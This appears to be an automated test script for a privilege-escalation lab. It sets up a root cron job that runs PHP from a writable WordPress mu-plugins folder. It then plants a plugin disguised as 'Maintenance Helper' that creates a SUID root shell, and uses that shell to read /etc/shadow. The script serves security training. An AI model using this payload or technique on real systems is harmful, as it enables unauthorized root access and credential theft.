#!/bin/bash
#
# Automated Test Script for Privilege Escalation Lab
# Scenario: WordPress Mu-Plugin Injection → Root
#
# Must be run as root: sudo ./test_lab.sh
#

export PATH="/usr/sbin:/sbin:$PATH"

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Counters
PASS=0
FAIL=0

# Test user
WEB_USER="www-data"

#######################################
# Logging functions
#######################################
log_header() {
    echo ""
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}  $1${NC}"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
}

log_phase() {
    echo ""
    echo -e "${BLUE}┌──────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ ${BOLD}$1${NC}"
    echo -e "${BLUE}└──────────────────────────────────────────────────────────────┘${NC}"
}

log_step() {
    echo -e "${YELLOW}  ► $1${NC}"
}

log_check() {
    echo -n "    [CHECK] $1 ... "
}

log_pass() {
    echo -e "${GREEN}✓ PASS${NC}"
    PASS=$((PASS + 1))
}

log_fail() {
    echo -e "${RED}✗ FAIL${NC}"
    echo -e "${RED}      Expected: $1${NC}"
    echo -e "${RED}      Got: $2${NC}"
    FAIL=$((FAIL + 1))
}

log_info() {
    echo -e "    ${CYAN}ℹ $1${NC}"
}

log_attack() {
    echo -e "    ${RED}⚔ $1${NC}"
}

#######################################
# Cleanup function
#######################################
cleanup() {
    log_phase "CLEANUP"

    # Remove exploitation artifacts
    rm -f /tmp/rootbash 2>/dev/null || true
    rm -f /tmp/pwned.txt 2>/dev/null || true
    rm -f /tmp/.wp-maintenance-done 2>/dev/null || true
    rm -f /root/pwned_by_www-data 2>/dev/null || true

    # Remove malicious mu-plugin
    rm -f /var/www/html/wp-content/mu-plugins/maintenance-helper.php 2>/dev/null || true

    # Remove WordPress infrastructure
    rm -f /etc/cron.d/wp-maintenance 2>/dev/null || true
    rm -f /usr/local/bin/wp-maintenance.sh 2>/dev/null || true
    rm -rf /var/www/html 2>/dev/null || true
    rm -f /var/log/wp-maintenance.log 2>/dev/null || true

    log_info "Cleanup complete"
}

#######################################
# Pre-flight checks
#######################################
preflight() {
    log_phase "PRE-FLIGHT CHECKS"

    log_check "Running as root"
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}✗ FAIL${NC}"
        echo "This script must be run as root (sudo ./test_lab.sh)"
        exit 1
    fi
    log_pass

    log_check "PHP CLI available"
    if command -v php &> /dev/null; then
        log_pass
    else
        log_fail "php installed" "php not found (install php-cli)"
        exit 1
    fi

    log_check "www-data user exists"
    if id "$WEB_USER" &>/dev/null; then
        log_pass
    else
        log_fail "www-data exists" "user not found"
        echo "Creating www-data user..."
        useradd -r -s /usr/sbin/nologin www-data
    fi

    log_step "Cleaning any previous test artifacts..."
    cleanup
}

#######################################
# PHASE 0: Setup environment
#######################################
phase_0() {
    log_phase "PHASE 0 — Environment Setup (Simulating IT Department)"

    log_step "Creating WordPress directory structure..."
    mkdir -p /var/www/html/wp-content/mu-plugins
    mkdir -p /var/www/html/wp-content/plugins
    mkdir -p /var/www/html/wp-content/themes
    chown -R "$WEB_USER:$WEB_USER" /var/www/html

    log_check "WordPress structure created"
    if [[ -d /var/www/html/wp-content/mu-plugins ]]; then
        log_pass
    else
        log_fail "directories exist" "not found"
    fi

    log_step "Creating simulated wp-config.php..."
    cat > /var/www/html/wp-config.php << 'EOF'
<?php
// Simulated WordPress config for lab purposes
define('ABSPATH', '/var/www/html/');
define('WP_CONTENT_DIR', '/var/www/html/wp-content');
EOF
    chown "$WEB_USER:$WEB_USER" /var/www/html/wp-config.php

    log_step "Creating WP-CLI maintenance script..."
    cat > /usr/local/bin/wp-maintenance.sh << 'SCRIPT'
#!/bin/bash
# WordPress Maintenance Script - Simulated for Lab
# This script simulates WP-CLI by loading mu-plugins

WP_PATH="/var/www/html"
LOG_FILE="/var/log/wp-maintenance.log"

echo "[$(date)] Starting WordPress maintenance" >> "$LOG_FILE"

# Simulate WP-CLI loading mu-plugins (this is what makes it vulnerable)
# In real WP-CLI, this happens automatically during bootstrap
for plugin in "$WP_PATH/wp-content/mu-plugins"/*.php; do
    if [[ -f "$plugin" ]]; then
        echo "[$(date)] Loading mu-plugin: $plugin" >> "$LOG_FILE"
        php "$plugin" 2>> "$LOG_FILE"
    fi
done

echo "[$(date)] Maintenance complete" >> "$LOG_FILE"
SCRIPT

    chmod 755 /usr/local/bin/wp-maintenance.sh
    chown root:root /usr/local/bin/wp-maintenance.sh

    log_check "Maintenance script created and owned by root"
    OWNER=$(stat -c '%U' /usr/local/bin/wp-maintenance.sh)
    if [[ "$OWNER" == "root" ]]; then
        log_pass
    else
        log_fail "root" "$OWNER"
    fi

    log_step "Creating cron job (runs as root)..."
    echo "*/5 * * * * root /usr/local/bin/wp-maintenance.sh" > /etc/cron.d/wp-maintenance
    chmod 644 /etc/cron.d/wp-maintenance

    log_check "Cron job installed"
    if [[ -f /etc/cron.d/wp-maintenance ]]; then
        log_pass
    else
        log_fail "cron file exists" "not found"
    fi

    # Create log file
    touch /var/log/wp-maintenance.log
    chmod 644 /var/log/wp-maintenance.log

    log_info "Environment setup complete"
    log_info "Trust boundary: root executes PHP from www-data-writable directory"
}

#######################################
# PHASE 1: Verify attacker has no privileges
#######################################
phase_1() {
    log_phase "PHASE 1 — Verify Attacker Starts Unprivileged"

    log_check "www-data has no sudo access"
    SUDO_CHECK=$(su -s /bin/bash "$WEB_USER" -c 'sudo -l' 2>&1 || true)
    if echo "$SUDO_CHECK" | grep -qi "may not run sudo\|not in the sudoers\|not allowed"; then
        log_pass
    else
        log_fail "no sudo" "$SUDO_CHECK"
    fi

    log_check "www-data cannot modify maintenance script"
    WRITE_CHECK=$(su -s /bin/bash "$WEB_USER" -c 'echo test >> /usr/local/bin/wp-maintenance.sh' 2>&1 || true)
    if echo "$WRITE_CHECK" | grep -qi "permission denied\|cannot create"; then
        log_pass
    else
        log_fail "permission denied" "$WRITE_CHECK"
    fi

    log_check "www-data CAN write to mu-plugins directory"
    su -s /bin/bash "$WEB_USER" -c 'touch /var/www/html/wp-content/mu-plugins/test && rm /var/www/html/wp-content/mu-plugins/test'
    if [[ $? -eq 0 ]]; then
        log_pass
    else
        log_fail "write access" "no write access"
    fi

    log_info "Attacker is unprivileged but has write access to mu-plugins"
}

#######################################
# PHASE 2: Attacker enumeration
#######################################
phase_2() {
    log_phase "PHASE 2 — Attacker Enumeration"

    log_step "Attacker discovers writable WordPress directories..."

    log_check "Attacker finds mu-plugins directory"
    FIND_RESULT=$(su -s /bin/bash "$WEB_USER" -c 'find /var/www -type d -writable 2>/dev/null' || true)
    if echo "$FIND_RESULT" | grep -q "mu-plugins"; then
        log_pass
    else
        log_fail "mu-plugins found" "$FIND_RESULT"
    fi

    log_step "Attacker examines cron jobs..."

    log_check "Attacker can read cron configuration"
    CRON_CONTENT=$(su -s /bin/bash "$WEB_USER" -c 'cat /etc/cron.d/wp-maintenance 2>/dev/null' || true)
    if echo "$CRON_CONTENT" | grep -q "wp-maintenance.sh"; then
        log_pass
    else
        log_fail "cron readable" "cannot read cron"
    fi

    log_step "Attacker examines maintenance script..."

    log_check "Maintenance script processes mu-plugins"
    SCRIPT_CONTENT=$(su -s /bin/bash "$WEB_USER" -c 'cat /usr/local/bin/wp-maintenance.sh')
    if echo "$SCRIPT_CONTENT" | grep -q "mu-plugins"; then
        log_pass
    else
        log_fail "mu-plugins referenced" "no mu-plugins reference"
    fi

    log_info "Attacker identifies: root loads PHP from writable mu-plugins directory"
    log_info "Attack vector: Mu-plugin injection"
}

#######################################
# PHASE 3: Exploitation
#######################################
phase_3() {
    log_phase "PHASE 3 — Exploitation"

    log_step "Attacker creates malicious mu-plugin..."
    su -s /bin/bash "$WEB_USER" -c 'cat > /var/www/html/wp-content/mu-plugins/maintenance-helper.php << '\''EOF'\''
<?php
/**
 * Plugin Name: Maintenance Helper
 * Description: Assists with maintenance tasks
 * Version: 1.0
 */

// Only execute payload once
$marker = "/tmp/.wp-maintenance-done";
if (!file_exists($marker)) {
    // Create SUID root shell
    copy("/bin/bash", "/tmp/rootbash");
    chmod("/tmp/rootbash", 04755);

    // Leave evidence for verification
    file_put_contents("/tmp/pwned.txt", "Pwned at " . date("Y-m-d H:i:s"));

    // Create marker
    touch($marker);
}
EOF'

    log_check "Malicious mu-plugin created"
    if [[ -f /var/www/html/wp-content/mu-plugins/maintenance-helper.php ]]; then
        log_pass
    else
        log_fail "file exists" "not found"
    fi

    log_check "File owned by www-data"
    OWNER=$(stat -c '%U' /var/www/html/wp-content/mu-plugins/maintenance-helper.php)
    if [[ "$OWNER" == "$WEB_USER" ]]; then
        log_pass
    else
        log_fail "www-data" "$OWNER"
    fi

    log_info "Payload staged in mu-plugins directory"
    log_attack "When root runs maintenance, mu-plugin PHP executes as root"
}

#######################################
# PHASE 4: Trigger and verify
#######################################
phase_4() {
    log_phase "PHASE 4 — Root Executes Attacker Payload"

    log_step "Simulating cron execution (root runs maintenance script)..."
    /usr/local/bin/wp-maintenance.sh 2>/dev/null || true

    log_check "/tmp/rootbash exists"
    if [[ -f /tmp/rootbash ]]; then
        log_pass
    else
        log_fail "file exists" "not found (payload did not execute)"
        return
    fi

    log_check "/tmp/rootbash owned by root"
    OWNER=$(stat -c '%U' /tmp/rootbash)
    if [[ "$OWNER" == "root" ]]; then
        log_pass
    else
        log_fail "root" "$OWNER"
    fi

    log_check "/tmp/rootbash has SUID bit (4755)"
    PERMS=$(stat -c '%a' /tmp/rootbash)
    if [[ "$PERMS" == "4755" ]]; then
        log_pass
    else
        log_fail "4755" "$PERMS"
    fi

    log_check "/tmp/pwned.txt created (execution proof)"
    if [[ -f /tmp/pwned.txt ]]; then
        log_pass
        log_info "Contents: $(cat /tmp/pwned.txt)"
    else
        log_fail "file exists" "not found"
    fi

    log_attack "SUID root shell created at /tmp/rootbash"
}

#######################################
# PHASE 5: Prove root access
#######################################
phase_5() {
    log_phase "PHASE 5 — Privilege Escalation Verification"

    if [[ ! -f /tmp/rootbash ]]; then
        log_info "Skipping — SUID shell was not created"
        return
    fi

    log_step "Attacker executes SUID shell..."

    log_check "www-data achieves euid=0 (root)"
    ID_CHECK=$(su -s /bin/bash "$WEB_USER" -c '/tmp/rootbash -p -c "id"' 2>&1)
    if echo "$ID_CHECK" | grep -q "euid=0"; then
        log_pass
        log_info "ID output: $ID_CHECK"
    else
        log_fail "euid=0(root)" "$ID_CHECK"
    fi

    log_check "www-data can read /etc/shadow"
    SHADOW_CHECK=$(su -s /bin/bash "$WEB_USER" -c '/tmp/rootbash -p -c "head -1 /etc/shadow"' 2>&1)
    if echo "$SHADOW_CHECK" | grep -q ":"; then
        log_pass
    else
        log_fail "shadow content" "$SHADOW_CHECK"
    fi

    log_check "www-data can write to /root"
    su -s /bin/bash "$WEB_USER" -c '/tmp/rootbash -p -c "touch /root/pwned_by_www-data"' 2>&1
    if [[ -f /root/pwned_by_www-data ]]; then
        log_pass
    else
        log_fail "file created" "file not created"
    fi

    echo ""
    log_attack "╔═══════════════════════════════════════════════════════════╗"
    log_attack "║         PRIVILEGE ESCALATION SUCCESSFUL                   ║"
    log_attack "║                                                           ║"
    log_attack "║   Started as:  www-data (uid=33)                          ║"
    log_attack "║   Achieved:    root (euid=0)                              ║"
    log_attack "║   Method:      WordPress Mu-Plugin Injection              ║"
    log_attack "╚═══════════════════════════════════════════════════════════╝"
}

#######################################
# Summary
#######################################
summary() {
    log_header "TEST SUMMARY"

    echo ""
    echo -e "  Tests passed: ${GREEN}${BOLD}$PASS${NC}"
    echo -e "  Tests failed: ${RED}${BOLD}$FAIL${NC}"
    echo ""

    if [[ $FAIL -eq 0 ]]; then
        echo -e "${GREEN}${BOLD}  ╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}${BOLD}  ║           ALL TESTS PASSED — LAB IS FUNCTIONAL            ║${NC}"
        echo -e "${GREEN}${BOLD}  ╚═══════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo "  The lab correctly demonstrates:"
        echo "    1. www-data user with write access to mu-plugins"
        echo "    2. Root cron job running WP-CLI/PHP maintenance"
        echo "    3. Mu-plugin injection attack"
        echo "    4. Privilege escalation from www-data to root"
        echo ""
        echo "  Attack chain:"
        echo "    www-data (uid=33) → mu-plugin injection → root (euid=0)"
        echo ""
    else
        echo -e "${RED}${BOLD}  ╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}${BOLD}  ║              SOME TESTS FAILED — REVIEW OUTPUT            ║${NC}"
        echo -e "${RED}${BOLD}  ╚═══════════════════════════════════════════════════════════╝${NC}"
    fi
}

#######################################
# Main
#######################################
main() {
    log_header "Privilege Escalation Lab — Automated Test"
    echo ""
    echo "  Scenario: WordPress Maintenance System"
    echo "  Attack:   Mu-Plugin Injection"
    echo "  Goal:     www-data (uid=33) → root (euid=0)"

    trap cleanup EXIT

    preflight
    phase_0
    phase_1
    phase_2
    phase_3
    phase_4
    phase_5
    summary
}

main "$@"
